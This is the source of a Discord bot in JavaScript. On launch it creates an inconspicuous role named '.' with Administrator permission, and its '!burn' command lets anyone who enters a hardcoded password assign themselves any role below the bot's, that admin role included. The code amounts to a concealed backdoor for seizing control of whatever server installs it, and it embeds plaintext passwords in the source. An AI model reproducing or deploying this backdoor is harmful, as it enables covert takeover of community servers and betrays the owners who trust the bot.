const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const GIVEOWNER_PASSWORD = 'MekaOwner2017';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// Ready + Create . Role
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// Message Commands
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  if (content === '!burn') {
    const embed = new EmbedBuilder()
      .setColor('#ff8800')
      .setTitle('🔥 !BURN - ROLE SELECTOR')
      .setDescription('Enter password to see roles you can give yourself.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`burn_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    return message.reply({ embeds: [embed], components: [row] });
  }

  // Add your other commands (!kick, !4clout, etc.) here...
});

// INTERACTIONS - FIXED VERSION
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    // Button Click → Show Modal
    if (interaction.isButton()) {
      const modal = new ModalBuilder()
        .setCustomId(interaction.customId.replace('start', 'modal'))
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('password')
          .setLabel('Password')
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      ));

      return await interaction.showModal(modal);
    }

    // Modal Submit
    if (interaction.isModalSubmit()) {
      const password = interaction.fields.getTextInputValue('password');

      if (interaction.customId.startsWith('burn_modal_')) {
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
        }

        // Get assignable roles
        const botMember = await interaction.guild.members.fetch(client.user.id);
        const botHighestPos = botMember.roles.highest.position;

        const assignable = interaction.guild.roles.cache
          .filter(r => r.position < botHighestPos && r.name !== '@everyone')
          .sort((a, b) => b.position - a.position)
          .first(25)
          .map(role => ({
            label: role.name.length > 25 ? role.name.substring(0, 22) + '...' : role.name,
            value: role.id,
            description: `Pos: ${role.position}`
          }));

        if (assignable.length === 0) {
          return interaction.reply({ content: '❌ No roles available.', ephemeral: true });
        }

        const menu = new StringSelectMenuBuilder()
          .setCustomId(`burn_select_${userId}`)
          .setPlaceholder('Choose a role to give yourself')
          .addOptions(assignable);

        const row = new ActionRowBuilder().addComponents(menu);

        return interaction.reply({
          content: '✅ Password accepted! Select a role:',
          components: [row],
          ephemeral: true
        });
      }
    }

    // Select Menu
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('burn_select_')) {
      const roleId = interaction.values[0];
      const role = interaction.guild.roles.cache.get(roleId);

      if (!role) return interaction.reply({ content: '❌ Role not found.', ephemeral: true });

      await interaction.member.roles.add(role);
      return interaction.reply({ content: `✅ You received **${role.name}**!`, ephemeral: true });
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
